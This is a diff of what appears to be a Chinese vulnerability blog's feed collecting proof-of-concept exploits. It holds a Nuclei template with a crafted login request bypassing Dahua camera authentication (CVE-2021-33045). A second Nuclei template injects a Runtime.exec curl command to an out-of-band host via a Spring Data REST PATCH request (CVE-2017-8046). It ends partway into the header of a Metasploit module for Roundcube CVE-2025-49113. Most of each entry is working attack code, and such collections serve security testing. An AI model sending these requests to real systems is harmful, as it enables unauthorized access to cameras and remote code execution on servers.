@@ -4,6 +4,87 @@
   
   
   <entry>
+    <title>Dahua IPC/VTH/VTO 认证绕过漏洞</title>
+    <link href="/2025/06/10/github_1525550666/"/>
+    <url>/2025/06/10/github_1525550666/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Dahua IPC&#x2F;VTH&#x2F;VTO 认证绕过漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2021-33045</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> 部分Dahua产品在登录过程中存在认证绕过漏洞。攻击者可以通过构造恶意数据包绕过设备身份认证。</p><p><strong>产品厂商：</strong> dahuasecurity</p><p><strong>产品名称：</strong> ipc-hum7xxx_firmware</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/a53788a05020af89123b4ef37f85d50b918a231f/http%2Fcves%2F2021%2FCVE-2021-33045.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/a53788a05020af89123b4ef37f85d50b918a231f/http%2Fcves%2F2021%2FCVE-2021-33045.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2021-33045</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Dahua IPC/VTH/VTO - Authentication Bypass</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">phantomowl</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">critical</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>    <span class="hljs-attribute">Some Dahua products contain an authentication bypass during the login process. Attackers can bypass device identity authentication by constructing malicious data packets.</span><br><span class="hljs-attribute">  reference</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/dorkerdevil/CVE-2021-33045</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://nvd.nist.gov/vuln/detail/CVE-2021-33045</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://seclists.org/fulldisclosure/2021/Oct/13</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/NyxAzrael/Goby_POC</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/WhaleFell/CameraHack</span><br>  <span class="hljs-attribute">classification</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">cvss-metrics</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span><br>    <span class="hljs-attribute">cvss-score</span><span class="hljs-punctuation">:</span> <span class="hljs-string">9.8</span><br>    <span class="hljs-attribute">cve-id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2021-33045</span><br>    <span class="hljs-attribute">cwe-id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CWE-287</span><br>    <span class="hljs-attribute">epss-score</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.93811</span><br>    <span class="hljs-attribute">epss-percentile</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.99853</span><br>    <span class="hljs-attribute">cpe</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cpe:2.3:o:dahuasecurity:ipc-hum7xxx_firmware:*:*:*:*:*:*:*:*</span><br>  <span class="hljs-attribute">metadata</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">max-request</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br>    <span class="hljs-attribute">vendor</span><span class="hljs-punctuation">:</span> <span class="hljs-string">dahuasecurity</span><br>    <span class="hljs-attribute">product</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ipc-hum7xxx_firmware</span><br>  <span class="hljs-attribute">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">dahua,cve,cve2021,auth-bypass,seclists,kev</span><br><br><span class="hljs-attribute">http</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br>        <span class="hljs-attribute">POST /RPC2_Login HTTP/1.1</span><br><span class="hljs-attribute">        Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;Hostname&#125;&#125;</span><br>        <span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Mozilla/5.0 (Debian; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0</span><br>        <span class="hljs-attribute">Connection</span><span class="hljs-punctuation">:</span> <span class="hljs-string">keep-alive</span><br>        <span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">:</span> <span class="hljs-string">288</span><br>        <span class="hljs-attribute">Accept</span><span class="hljs-punctuation">:</span> <span class="hljs-string">*/*</span><br>        <span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">:</span> <span class="hljs-string">en</span><br>        <span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/json</span><br>        <span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gzip, deflate, br</span><br><br>        <span class="hljs-attribute">&#123;</span><br><span class="hljs-attribute">          &quot;method&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;global.login&quot;,</span><br>          <span class="hljs-attribute">&quot;params&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;</span><br>            <span class="hljs-attribute">&quot;userName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;,</span><br>            <span class="hljs-attribute">&quot;ipAddr&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;,</span><br>            <span class="hljs-attribute">&quot;loginType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Direct&quot;,</span><br>            <span class="hljs-attribute">&quot;clientType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;NetKeyboard&quot;,</span><br>            <span class="hljs-attribute">&quot;authorityType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Default&quot;,</span><br>            <span class="hljs-attribute">&quot;passwordType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Plain&quot;,</span><br>            <span class="hljs-attribute">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><br>          <span class="hljs-attribute">&#125;,</span><br><span class="hljs-attribute">          &quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1,</span><br>          <span class="hljs-attribute">&quot;session&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0</span><br>        <span class="hljs-attribute">&#125;</span><br><span class="hljs-attribute">    matchers-condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">body</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;\&quot;result\&quot;:true&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: regex</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">body</span><br>        <span class="hljs-attribute">regex</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;\&quot;session\&quot;:\&quot;[a-f0-9]&#123;32&#125;\&quot;&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">header</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;HTTP/1.1 200 OK&quot;</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>projectdiscovery/nuclei-templates:github issues</tag>
+      
+      <tag>权限绕过</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Spring Data REST PATCH请求远程代码执行漏洞</title>
+    <link href="/2025/06/10/github_2639279159/"/>
+    <url>/2025/06/10/github_2639279159/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Spring Data REST PATCH请求远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2017-8046</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Spring Data REST &lt; 2.6.9和3.0.1，Spring Boot &lt; 1.5.9和2.0 M6存在远程代码执行漏洞，攻击者可以通过发送恶意的PATCH请求，利用特制的JSON数据执行任意Java代码。</p><p><strong>产品厂商：</strong> pivotal_software</p><p><strong>产品名称：</strong> Spring Data REST</p><p><strong>影响版本：</strong> &lt; 2.6.9, 3.0.1</p><p><strong>搜索语法：</strong> http.title:”eureka”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/79c14354e8bbf555b0877ac87b03b3b1ccb2d23e/http%2Fcves%2F2017%2FCVE-2017-8046.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/79c14354e8bbf555b0877ac87b03b3b1ccb2d23e/http%2Fcves%2F2017%2FCVE-2017-8046.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>7-<span class="hljs-number">8046</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Spring Data REST <span class="hljs-operator">&lt;</span> <span class="hljs-number">2.6</span>.<span class="hljs-number">9</span> (Ingalls SR9) <span class="hljs-symbol">/</span> <span class="hljs-number">3.0</span>.<span class="hljs-number">1</span> (Kay SR1) <span class="hljs-operator">-</span> PATCH Request Remote Code Execution<br>  <span class="hljs-params">author:</span> domwhewell-sage<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Spring Data REST <span class="hljs-operator">&lt;</span> <span class="hljs-number">2.6</span>.<span class="hljs-number">9</span> and <span class="hljs-number">3.0</span>.<span class="hljs-number">1</span>, Spring Boot <span class="hljs-operator">&lt;</span> <span class="hljs-number">1.5</span>.<span class="hljs-number">9</span> and <span class="hljs-number">2.0</span> M6 contain a remote code execution caused by processing malicious PATCH requests <span class="hljs-keyword">with</span> crafted JSON data, letting attackers execute arbitrary Java code, exploit requires sending malicious PATCH requests.<br>  <span class="hljs-params">impact:</span> |<br>    Malicious PATCH requests submitted to servers using Spring Data REST versions prior to <span class="hljs-number">2.6</span>.<span class="hljs-number">9</span> (Ingalls SR9), versions prior to <span class="hljs-number">3.0</span>.<span class="hljs-number">1</span> (Kay SR1) and Spring Boot versions prior to <span class="hljs-number">1.5</span>.<span class="hljs-number">9</span>, <span class="hljs-number">2.0</span> M6 can use specially crafted JSON data to run arbitrary Java code.<br>  <span class="hljs-params">remediation:</span> |<br>    To remediate this vulnerability, update to Spring Data REST version <span class="hljs-number">2.6</span>.<span class="hljs-number">9</span> <span class="hljs-keyword">or</span> later, <span class="hljs-keyword">or</span> <span class="hljs-number">3.0</span>.<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> later, and Spring Boot version <span class="hljs-number">1.5</span>.<span class="hljs-number">9</span> <span class="hljs-keyword">or</span> later, <span class="hljs-keyword">or</span> <span class="hljs-number">2.0</span> M6 <span class="hljs-keyword">or</span> later.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2017-8046</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//spring.io/security/cve-2017-8046</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.0</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>7-<span class="hljs-number">8046</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">20</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:pivotal_software:spring_data_rest:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">vendor:</span> pivotal_software<br>    <span class="hljs-params">product:</span> spring_data_rest<br>    <span class="hljs-params">shodan-query:</span> http.title:<span class="hljs-string">&quot;eureka&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2017,pivotal,springboot,pivotal_software<br><br><span class="hljs-params">flow:</span> |<br>  http(<span class="hljs-number">1</span>)<br>  for(<span class="hljs-keyword">let</span> endpoint_urls of iterate(template.endpoints))&#123;<br>    set(<span class="hljs-string">&quot;endpoints&quot;</span>, endpoint_urls)<br>    http(<span class="hljs-number">2</span>)<br>  &#125;<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;&quot;</span><br><br>    <span class="hljs-params">redirects:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-redirects:</span> <span class="hljs-number">3</span><br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;application/json&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;application/hal+json&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;application/vnd.spring-boot.actuator&quot;</span><br>        <span class="hljs-params">condition:</span> <span class="hljs-keyword">or</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;_embedded&quot;</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;_links&quot;</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;page&quot;</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;size&quot;</span>&#x27;<br>        <span class="hljs-params">condition:</span> <span class="hljs-keyword">or</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> endpoints<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;href&quot;</span>\s<span class="hljs-operator">*</span>:\s<span class="hljs-operator">*</span><span class="hljs-string">&quot;([^&quot;</span>&#123;]<span class="hljs-operator">+</span>)&#x27;<br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> PATCH<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;endpoints&#125;&#125;/1&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json-patch+json</span><br>    <span class="hljs-params">body:</span> |<br>      [<br>        &#123;<br>          <span class="hljs-string">&quot;op&quot;</span>: <span class="hljs-string">&quot;replace&quot;</span>,<br>          <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;T(java.lang.Runtime).getRuntime().exec(<span class="hljs-char escape_">\&quot;</span>curl &#123;&#123;interactsh-url&#125;&#125;<span class="hljs-char escape_">\&quot;</span>).x&quot;</span>,<br>          <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;CVE-2017-8046&quot;</span><br>        &#125;<br>      ]<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> interactsh_protocol<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> dns<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;org.springframework&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>projectdiscovery/nuclei-templates:github issues</tag>
+      
+      <tag>命令执行</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Roundcube Post-Auth RCE via PHP Object Deserialization</title>
+    <link href="/2025/06/10/github_1576518626/"/>
+    <url>/2025/06/10/github_1576518626/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Roundcube Post-Auth RCE via PHP Object Deserialization</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-49113</li></ul><p><strong>漏洞类型：</strong> 反序列化</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Roundcube Webmail在1.5.10之前和1.6.x在1.6.11之前的版本中，由于program&#x2F;actions&#x2F;settings&#x2F;upload.php中的_from参数未经验证，导致PHP对象反序列化漏洞，允许认证用户执行远程代码。攻击者可以以web服务器权限执行任意系统命令。</p><p><strong>产品厂商：</strong> Roundcube</p><p><strong>产品名称：</strong> Roundcube Webmail</p><p><strong>影响版本：</strong> 1.6.x &lt; 1.6.11, before 1.5.10</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/8fe5c91801626d7f0be8f4e74ffb8fc9cc44477d/modules%2Fexploits%2Fmulti%2Fhttp%2Froundcube_auth_rce_cve_2025_49113.rb">https://github.com/rapid7/metasploit-framework/blob/8fe5c91801626d7f0be8f4e74ffb8fc9cc44477d/modules%2Fexploits%2Fmulti%2Fhttp%2Froundcube_auth_rce_cve_2025_49113.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: 